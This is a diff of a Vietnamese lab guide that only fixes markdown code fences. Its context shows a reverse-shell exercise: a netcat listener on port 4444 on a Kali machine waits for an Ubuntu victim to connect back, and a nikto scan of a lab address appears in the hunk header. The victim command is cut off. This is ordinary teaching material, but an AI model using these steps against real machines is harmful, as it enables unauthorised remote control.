@@ -251,10 +251,10 @@ nikto -h http://192.168.60.40
 - **Mục tiêu:** Mô phỏng việc kẻ tấn công dụ nạn nhân chạy mã độc, khiến máy nạn nhân (Ubuntu) kết nối ngược về máy tấn công (Kali), cho phép kẻ tấn công điều khiển dòng lệnh.
 - **Trên máy Kali Attacker**
   Mở một cổng lắng nghe (Listener) để chờ kết nối từ nạn nhân.
-  `powershell
+  ```powershell
   # Lắng nghe trên cổng 4444
   nc -nvlp 4444
-  `
+  ```
 - **Trên máy Ubuntu victim**
   Trong thực tế, bước này xảy ra khi người dùng click vào file độc hại hoặc bị khai thác lỗ hổng web. Trong Lab, chúng ta sẽ tự chạy lệnh này để mô phỏng (Simulate).
 - Mở terminal trên Ubuntu và chạy lệnh sau:
